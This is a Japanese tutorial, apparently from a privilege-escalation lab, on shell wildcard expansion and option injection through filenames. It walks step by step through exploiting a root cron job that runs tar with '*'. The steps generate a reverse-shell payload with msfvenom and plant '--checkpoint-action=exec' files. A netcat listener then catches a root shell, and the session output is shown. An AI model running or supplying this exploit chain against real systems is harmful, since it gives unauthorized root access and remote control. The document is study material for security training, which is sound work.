ワイルドカード文字 (*) が引数の一部としてコマンドに提供されると、シェルは最初にワイルドカードでファイル名展開 (グロビングとも呼ばれます) を実行します。    
このプロセスにより、ワイルドカードが、現在のディレクトリ内のファイル名とディレクトリ名のスペース区切りのリストに置き換えられます。    
これを実際に確認する簡単な方法は、ホーム ディレクトリから次のコマンドを実行することです。   
```
$ echo *
```
Linux のファイルシステムは通常、ファイル名に対して非常に寛容であり、コマンドが実行される前にファイル名の展開が行われるため、これらの名前でファイルを作成することにより、コマンド ライン オプション (-h、--help など) をコマンドに渡すことができます。   
次のコマンドは、これがどのように機能するかを示しています。  
```
$ ls *
% touch ./-l
$ ls *
```
ファイル名は、-hや--helpのような単純なオプションに限定されるものではありません。   
実際、複雑なオプションにマッチするファイル名を作ることができます。   
--option=key=value   
GTFOBins (https://gtfobins.github.io) は、コマンドにコマンドラインオプションがあるかどうかを判断するのに役立ちます。   
# Privilege Escalation
1. システム全体のcrontabの内容を表示します。
```
$ cat /etc/crontab
...
* * * * * root /usr/local/bin/compress.sh
```
2. usr/local/bin/compress.sh ファイルの内容を表示します。
```
$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
なお、tarコマンドは/home/userディレクトリでワイルドカードを使用して実行されます。   
3. GTFOBins は、tar にコマンド ライン オプションがあることを示しています。   
これは、チェックポイント機能の一部として他のコマンドを実行するために使用できます。   
4. msfvenom を使用して、リバースシェル ELF ペイロードを作成します
```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=53 -f elf -o shell.elf
```
5. リモートホストの/home/userディレクトリにファイルをコピーし、実行可能な状態にします。
```
$ chmod +x /home/user/shell.elf
```
6. home/userディレクトリに2つのファイルを作成します。
```
$ touch /home/user/--checkpoint=1
$ touch /home/user/--checkpoint-action=exec=shell.elf
```
7. ローカルマシンでnetcatリスナーを実行し、cronジョブが実行されるのを待ちます。ルートユーザーで実行しているリバースシェルが引っかかるはずです。
```
# nc -nvlp 53
listening on [any] 53 ...
connect to [192.168.1.26] from (UNKNOWN) [192.168.1.25] 47362
bash: no job control in this shell
root@debian:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```
